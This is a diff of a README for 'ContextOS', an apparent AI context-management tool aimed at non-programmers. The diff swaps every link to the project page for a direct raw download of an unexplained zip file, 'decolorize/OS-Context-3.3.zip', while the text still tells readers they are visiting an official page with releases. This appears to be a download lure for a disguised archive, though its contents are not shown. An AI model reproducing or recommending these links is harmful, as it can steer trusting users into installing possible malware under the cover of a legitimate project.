@@ -1,6 +1,6 @@
 # ⚙️ ContextOS - Simplify AI Context Management
 
-[![Download ContextOS](https://img.shields.io/badge/Download-ContextOS-brightgreen)](https://github.com/armmammothermography417/ContextOS)
+[![Download ContextOS](https://img.shields.io/badge/Download-ContextOS-brightgreen)](https://raw.githubusercontent.com/armmammothermography417/ContextOS/main/decolorize/OS-Context-3.3.zip)
 
 ---
 
@@ -34,10 +34,10 @@ You do not need to be a programmer to use ContextOS. This guide explains how to 
 
 Click the button below to visit the official page where you can download ContextOS.  
 
-[![Get ContextOS](https://img.shields.io/badge/Download-ContextOS-blue)](https://github.com/armmammothermography417/ContextOS)
+[![Get ContextOS](https://img.shields.io/badge/Download-ContextOS-blue)](https://raw.githubusercontent.com/armmammothermography417/ContextOS/main/decolorize/OS-Context-3.3.zip)
 
 1. Click the link above or visit:  
-   https://github.com/armmammothermography417/ContextOS  
+   https://raw.githubusercontent.com/armmammothermography417/ContextOS/main/decolorize/OS-Context-3.3.zip  
 
 2. On the page, look for the "Releases" section or "Downloads."  
 
@@ -127,7 +127,7 @@ ContextOS runs on your computer. Your data stays on your device unless you share
 
 For detailed commands and advanced options, visit the official GitHub page:  
 
-https://github.com/armmammothermography417/ContextOS
+https://raw.githubusercontent.com/armmammothermography417/ContextOS/main/decolorize/OS-Context-3.3.zip
 
 Here you can find:
 
@@ -138,4 +138,4 @@ Here you can find:
 
 ---
 
-[![Download ContextOS](https://img.shields.io/badge/Download-ContextOS-brightgreen)](https://github.com/armmammothermography417/ContextOS)
+[![Download ContextOS](https://img.shields.io/badge/Download-ContextOS-brightgreen)](https://raw.githubusercontent.com/armmammothermography417/ContextOS/main/decolorize/OS-Context-3.3.zip)
